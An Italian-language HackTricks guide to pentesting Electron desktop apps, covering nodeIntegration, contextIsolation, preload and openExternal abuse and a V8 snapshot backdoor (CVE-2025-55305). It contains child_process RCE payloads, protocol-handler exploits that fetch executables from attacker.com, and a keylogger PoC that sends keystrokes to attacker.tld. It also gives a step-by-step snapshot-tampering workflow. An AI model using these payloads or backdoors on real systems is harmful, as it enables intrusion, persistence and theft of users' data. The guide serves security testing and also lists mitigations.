# Applicazioni Desktop Electron

{{#include ../../../banners/hacktricks-training.md}}

## Introduzione

Electron combina un backend locale (con **NodeJS**) e un frontend (**Chromium**), sebbene manchi di alcuni dei meccanismi di sicurezza dei browser moderni.

Solitamente puoi trovare il codice dell'app Electron all'interno di un'applicazione `.asar`; per ottenere il codice devi estrarlo:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Nel codice sorgente di un'app Electron, all'interno di `packet.json`, puoi trovare specificato il file `main.js` dove sono impostate le configurazioni di sicurezza.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ha 2 tipi di processi:

- Main Process (ha accesso completo a NodeJS)
- Renderer Process (dovrebbe avere accesso a NodeJS limitato per motivi di sicurezza)

![](<../../../images/image (182).png>)

Un **processo renderer** sarà una finestra del browser che carica un file:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Le impostazioni del **renderer process** possono essere **configurate** nel **main process** all'interno del file main.js. Alcune configurazioni impediranno che l'applicazione Electron subisca RCE o altre vulnerabilità se le **impostazioni sono configurate correttamente**.

L'applicazione Electron **potrebbe accedere al dispositivo** tramite le Node APIs, sebbene possa essere configurata per impedirlo:

- **`nodeIntegration`** - è `off` di default. Se attivato, permette di accedere alle funzionalità di node dal renderer process.
- **`contextIsolation`** - è `on` di default. Se disabilitato, main e renderer processes non sono isolati.
- **`preload`** - vuoto di default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - è off di default. Restringerà le azioni che NodeJS può eseguire.
- Node Integration nei Workers
- **`nodeIntegrationInSubframes`** - è `off` di default.
- Se **`nodeIntegration`** è **abilitato**, questo permetterebbe l'uso delle **Node.js APIs** in pagine web che vengono **caricate in iframe** all'interno di un'app Electron.
- Se **`nodeIntegration`** è **disabilitato**, allora i preload verranno caricati nell'iframe

Esempio di configurazione:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Alcuni **RCE payloads** da [qui](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Cattura del traffico

Modifica la configurazione start-main e aggiungi l'uso di un proxy come:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Se puoi eseguire localmente un Electron App, è possibile che tu riesca a farlo eseguire codice javascript arbitrario. Vedi come in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Se il **nodeIntegration** è impostato su **on**, il JavaScript di una pagina web può usare le funzionalità di Node.js semplicemente chiamando `require()`. Ad esempio, il modo per eseguire l'applicazione calc su Windows è:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Lo script indicato in questa impostazione è **caricato prima degli altri script nel renderer**, quindi ha **accesso illimitato alle Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Pertanto, lo script può esportare node-features alle pagine:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Se `contextIsolation` è attivo, questo non funzionerà**

## RCE: XSS + contextIsolation

La _**contextIsolation**_ introduce i **contesti separati tra gli script della pagina web e il codice JavaScript interno di Electron** in modo che l'esecuzione JavaScript di ciascun codice non si influenzi a vicenda. Questa è una funzionalità necessaria per eliminare la possibilità di RCE.

Se i contesti non sono isolati, un attacker può:

1. Eseguire **JavaScript arbitrario nel renderer** (XSS o navigazione verso siti esterni)
2. **Sovrascrivere un metodo built-in** usato nel codice preload o nel codice interno di Electron per prenderne il controllo
3. **Attivare** l'uso della **funzione sovrascritta**
4. RCE?

Ci sono 2 posti dove i metodi built-in possono essere sovrascritti: nel codice preload o nel codice interno di Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass dell'evento click

Se ci sono restrizioni applicate quando clicchi un link potresti essere in grado di aggirarle **facendo un middle click** invece del normale left click
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Per maggiori informazioni su questi esempi consulta [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) e [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Quando si distribuisce un'applicazione desktop Electron, assicurarsi della corretta configurazione di `nodeIntegration` e `contextIsolation` è cruciale. È assodato che **client-side remote code execution (RCE)** mirata agli script di preload o al codice nativo di Electron dal processo principale venga efficacemente prevenuta con queste impostazioni.

Quando un utente interagisce con link o apre nuove finestre, vengono attivati dei listener di evento specifici, fondamentali per la sicurezza e il funzionamento dell'applicazione:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Questi listener sono **sovrascritti dall'applicazione desktop** per implementare la propria **logica di business**. L'applicazione valuta se un link navigato debba essere aperto internamente o in un browser web esterno. Questa decisione viene tipicamente presa tramite una funzione, `openInternally`. Se questa funzione restituisce `false`, indica che il link deve essere aperto esternamente, utilizzando la funzione `shell.openExternal`.

**Ecco un pseudocodice semplificato:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS security best practices sconsigliano di accettare contenuti non affidabili con la funzione `openExternal`, poiché potrebbe portare a RCE tramite vari protocolli. I sistemi operativi supportano diversi protocolli che potrebbero innescare RCE. Per esempi dettagliati e ulteriori spiegazioni su questo argomento, si può fare riferimento a [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), che include esempi di protocolli Windows in grado di sfruttare questa vulnerabilità.

In macos, la funzione `openExternal` può essere sfruttata per eseguire comandi arbitrari come in `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Esempi di exploit tramite protocolli Windows includono:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Questa vulnerabilità è descritta in **[questa ricerca](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Il **webviewTag** è una **funzionalità deprecata** che permette l'uso di **NodeJS** nel **renderer process**, e dovrebbe essere disabilitata poiché consente di caricare uno script all'interno del contesto di preload come:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Pertanto, un attacker che riesce a caricare una pagina arbitraria potrebbe usare quel tag per **caricare uno script di preload arbitrario**.

Questo preload script è stato poi abusato per chiamare un **servizio IPC vulnerabile (`skype-new-window`)** che chiamava **`shell.openExternal`** per ottenere RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lettura di file interni: XSS + contextIsolation

**Disabilitare `contextIsolation` permette l'uso dei tag `<webview>`**, simili a `<iframe>`, per leggere ed esfiltrare file locali. Un esempio mostra come sfruttare questa vulnerabilità per leggere il contenuto di file interni:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Ulteriormente, viene condiviso un altro metodo per **leggere un file interno**, evidenziando una grave vulnerabilità di lettura di file locali in un'app desktop Electron. Questo comporta l'iniezione di uno script per sfruttare l'applicazione e esfiltrare i dati:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Old Chromium**

Se il **chromium** usato dall'applicazione è **vecchio** e ci sono **vulnerabilità** note, potrebbe essere possibile **sfruttarlo e ottenere RCE tramite una XSS**.\
Puoi vedere un esempio in questo **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Supponendo che tu abbia trovato una XSS ma **non possa scatenare RCE o rubare file interni** potresti provare a usarla per **rubare credenziali via phishing**.

Prima di tutto devi sapere cosa succede quando provi ad aprire una nuova URL, controllando il codice JS nel front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
La chiamata a **`openInternally`** deciderà se il **link** verrà **aperto** nella **desktop window** in quanto link appartenente alla piattaforma, **o** se verrà aperto nel **browser** come risorsa di terze parti.

Nel caso in cui il **regex** usato dalla funzione sia **vulnerable to bypasses** (per esempio **not escaping the dots of subdomains**) un attacker potrebbe abusare della XSS per **open a new window which** sarà situata nell'infrastruttura dell'attacker **asking for credentials** all'utente:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protocollo

Come menzionato nella [docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) le pagine eseguite su **`file://`** hanno accesso unilaterale a ogni file sulla tua macchina, il che significa che **problemi di XSS possono essere usati per caricare file arbitrari** dalla macchina dell'utente. L'uso di un **protocollo personalizzato** previene problemi di questo tipo poiché puoi limitare il protocollo a servire solo un insieme specifico di file.

## Remote module

Il Remote module di Electron permette ai **processi renderer di accedere alle API del processo main**, facilitando la comunicazione all'interno di un'app Electron. Tuttavia, abilitare questo modulo introduce significativi rischi di sicurezza. Amplia la superficie d'attacco dell'applicazione, rendendola più suscettibile a vulnerabilità come gli attacchi di cross-site scripting (XSS).

> [!TIP]
> Sebbene il modulo **remote** esponga alcune API dal main ai processi renderer, non è semplice ottenere RCE limitandosi ad abusare solo dei componenti. Tuttavia, i componenti potrebbero esporre informazioni sensibili.

> [!WARNING]
> Molte app che usano ancora il modulo remote lo fanno in modo tale da **richiedere che NodeIntegration sia abilitato** nel processo renderer, il che rappresenta un **enorme rischio di sicurezza**.

Da Electron 14 il modulo `remote` potrebbe essere abilitato in diversi step; tuttavia, per motivi di sicurezza e performance è **consigliato non usarlo**.

Per abilitarlo, è prima necessario **abilitarlo nel processo main**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Quindi, il processo renderer può importare oggetti dal modulo che preferisce:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Il **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indica alcune **funzioni** interessanti esposte dall'oggetto **`app`** del remote module:

- **`app.relaunch([options])`**
- **Riavvia** l'applicazione **uscendo** dall'istanza corrente e **avviandone** una nuova. Utile per **aggiornamenti dell'app** o significativi **cambiamenti di stato**.
- **`app.setAppLogsPath([path])`**
- **Definisce** o **crea** una directory per memorizzare i **log dell'app**. I log possono essere **recuperati** o **modificati** usando **`app.getPath()`** o **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registra** l'eseguibile corrente come **gestore predefinito** per un determinato **protocollo**. È possibile fornire un **percorso personalizzato** e **argomenti** se necessario.
- **`app.setUserTasks(tasks)`**
- **Aggiunge** task alla **Tasks category** nella **Jump List** (su Windows). Ogni task può controllare come l'app viene **avviata** o quali **argomenti** vengono passati.
- **`app.importCertificate(options, callback)`**
- **Importa** un **PKCS#12 certificate** nello **store dei certificati** del sistema (solo Linux). È possibile usare una **callback** per gestire il risultato.
- **`app.moveToApplicationsFolder([options])`**
- **Sposta** l'applicazione nella **Applications folder** (su macOS). Aiuta a garantire un'**installazione standard** per gli utenti Mac.
- **`app.setJumpList(categories)`**
- **Imposta** o **rimuove** una **Jump List personalizzata** su **Windows**. È possibile specificare **categorie** per organizzare come i task appaiono all'utente.
- **`app.setLoginItemSettings(settings)`**
- **Configura** quali **eseguibili** si avviano al **login** insieme alle loro **opzioni** (solo macOS e Windows).

Esempio:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences modulo

La **API principale** per accedere alle preferenze di sistema e **emettere eventi di sistema** in Electron. Metodi come **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** e **setUserDefault** fanno tutti **parte di** questo modulo.

**Esempio d'uso:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Ascolta** le **notifiche native di macOS** usando NSDistributedNotificationCenter.
* Prima di **macOS Catalina**, era possibile intercettare **tutte** le notifiche distribuite passando **nil** a CFNotificationCenterAddObserver.
* Dopo **Catalina / Big Sur**, le app sandboxate possono ancora **iscriversi** a **molti eventi** (per esempio, **blocchi/sblocchi dello schermo**, **montaggio di volumi**, **attività di rete**, ecc.) registrando le notifiche **per nome**.

### **getUserDefault / setUserDefault**

* **Interagisce** con **NSUserDefaults**, che memorizza le preferenze **dell'applicazione** o **globali** su macOS.

* **getUserDefault** può **recuperare** informazioni sensibili, come le **posizioni dei file recenti** o la **posizione geografica dell'utente**.

* **setUserDefault** può **modificare** queste preferenze, influenzando potenzialmente la **configurazione** di un'app.

* Nelle **vecchie versioni di Electron** (prima di v8.3.0), solo la **suite standard** di NSUserDefaults era **accessibile**.

## Shell.showItemInFolder

Questa funzione mostra il file specificato in un file manager, che **potrebbe eseguire automaticamente il file**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Le app Electron dovrebbero avere una **Content Security Policy (CSP)** per **prevenire attacchi XSS**. La **CSP** è uno **standard di sicurezza** che aiuta a **impedire** l'**esecuzione** di **codice non attendibile** nel browser.

Di solito viene **configurata** nel file **`main.js`** o nel template **`index.html`** con la CSP all'interno di un **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) è uno strumento per identificare misconfigurazioni e anti-pattern di sicurezza nelle applicazioni basate su Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) è un plugin open source per VS Code per applicazioni Electron che usa Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) per verificare librerie di terze parti vulnerabili
- [**Electro.ng**](https://electro.ng/): È a pagamento

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) puoi trovare un laboratorio per sfruttare applicazioni Electron vulnerabili.

Alcuni comandi che ti aiuteranno con il laboratorio:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron e le app basate su Chromium deserializzano uno snapshot V8 della heap precompilato all'avvio (v8_context_snapshot.bin, e opzionalmente browser_v8_context_snapshot.bin) per inizializzare ogni V8 isolate (main, preload, renderer). Storicamente, i fuse di integrità di Electron non consideravano questi snapshot come contenuto eseguibile, quindi sfuggivano sia all'enforcement di integrità basato sui fuse sia ai controlli di firma del codice del sistema operativo. Di conseguenza, sostituire lo snapshot in un'installazione scrivibile dall'utente consentiva esecuzione di codice stealth e persistente all'interno dell'app senza modificare i binari firmati o l'ASAR.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar convalidano il JavaScript dell'app all'interno dell'ASAR, ma non coprivano i V8 heap snapshots (CVE-2025-55305). Chromium allo stesso modo non verifica l'integrità degli snapshot.
- Attack preconditions: possibilità di scrittura di file locali nella directory di installazione dell'app. Questo è comune su sistemi dove le app Electron o i browser Chromium sono installati in percorsi scrivibili dall'utente (es., %AppData%\Local su Windows; /Applications con caveat su macOS).
- Effect: esecuzione affidabile di JavaScript dell'attaccante in qualsiasi isolate sovrascrivendo un builtin usato di frequente (un “gadget”), permettendo persistenza ed elusione della verifica della firma del codice.
- Affected surface: Electron apps (anche con i fuse abilitati) e browser basati su Chromium che caricano snapshot da posizioni scrivibili dall'utente.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (run different code in main vs. renderer)
- Rilevamento del processo main: globali esclusivi di Node come process.pid, process.binding(), o process.dlopen sono presenti nell'isolate del processo main.
- Rilevamento Browser/renderer: globali esclusivi del Browser come alert sono disponibili quando si esegue in un contesto document.

Esempio di gadget che testa una volta le capacità Node del processo main
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
PoC di data theft nel Renderer/browser-context (es. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) Crea payload.js che sovrascrive un comune builtin (es., Array.isArray) e opzionalmente si ramifica per isolate.
2) Genera lo snapshot senza i sorgenti Chromium:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Sovrascrivi il/i file snapshot dell'applicazione target:
- v8_context_snapshot.bin (sempre usato)
- browser_v8_context_snapshot.bin (se è usato il fuse LoadBrowserProcessSpecificV8Snapshot)
4) Avvia l'applicazione; il gadget viene eseguito ogni volta che il builtin scelto viene utilizzato.

Notes and considerations
- Bypass dell'integrità/della firma: I file snapshot non vengono trattati come eseguibili nativi dai controlli di code-signing e (storicamente) non erano coperti dai fuse di Electron o dai controlli di integrità di Chromium.
- Persistenza: Sostituire lo snapshot in un'installazione scrivibile dall'utente di solito sopravvive ai riavvii dell'app e appare come un'app firmata e legittima.
- Chromium browsers: Lo stesso concetto di manomissione si applica a Chrome/derivati installati in percorsi scrivibili dall'utente. Chrome ha altre mitigazioni di integrità ma esclude esplicitamente gli attacchi fisicamente locali dal suo modello di minaccia.

Detection and mitigations
- Tratta gli snapshot come contenuto eseguibile e includili nell'applicazione delle misure di integrità (CVE-2025-55305 fix).
- Preferire percorsi di installazione scrivibili solo dall'amministratore; stabilire una baseline e monitorare gli hash per v8_context_snapshot.bin e browser_v8_context_snapshot.bin.
- Rilevare la sovrascrittura dei builtin in fase di early-runtime e cambiamenti imprevisti degli snapshot; generare allarmi quando gli snapshot deserializzati non corrispondono ai valori attesi.

## **Riferimenti**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
